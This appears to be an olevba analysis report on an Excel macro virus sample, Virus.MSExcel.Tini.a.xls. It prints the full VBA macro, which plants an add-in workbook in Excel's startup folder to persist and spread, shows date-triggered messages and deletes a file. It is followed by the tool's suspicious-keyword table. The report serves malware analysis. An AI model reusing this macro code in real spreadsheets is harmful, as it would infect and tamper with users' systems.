olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Tini.a.xls
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSExcel.Tini.a.xls 
in file: Virus.MSExcel.Tini.a.xls - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Dim Fso,Wsh,Cell,myBook,MyText
Set Fso = CreateObject("scripting.filesystemobject")
Set wsh = CreateObject("wscript.shell")
Set cell = CreateObject("excel.application")
if Fso.fileexists(cell.StartupPath + "\yinyin3345.xls") = false then
Set Mybook = cell.Workbooks.Add
Mybook.IsAddin = True
Mybook.VBProject.VBComponents("ThisWorkbook").CodeModule.addfromfile "c:\windows\system\happybirthday"
Mybook.SaveAs UCase(cell.StartupPath + "\yinyin3345.xls"), 18
Mybook.Close
Set cell = Nothing
end if
If Month(Date) = 11 And Day(Date) = 4 Then
MsgBox "ףMS.YINYIN3345С���MR.myfrien4061���տ���!!!!!!!!", vbOKOnly,"YINYIN3345������ʾ"
Fso.deletefile wsh.specialfolders("Templates") &  "\software\yinyin3345.vbs"
elseif weekday(date)= 5 then
MsgBox "���ĵ���������ֲ������������⣬���ϵͳ����Ա��ϵ��", vbOKOnly,"YINYIN3345������ʾ"
Fso.deletefile wsh.specialfolders("Templates") &  "\software\yinyin3345.vbs"
else
end if
set fso = nothing
set wsh = nothing
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |yinyin3345.vbs      |Executable file name                         |
+----------+--------------------+---------------------------------------------+

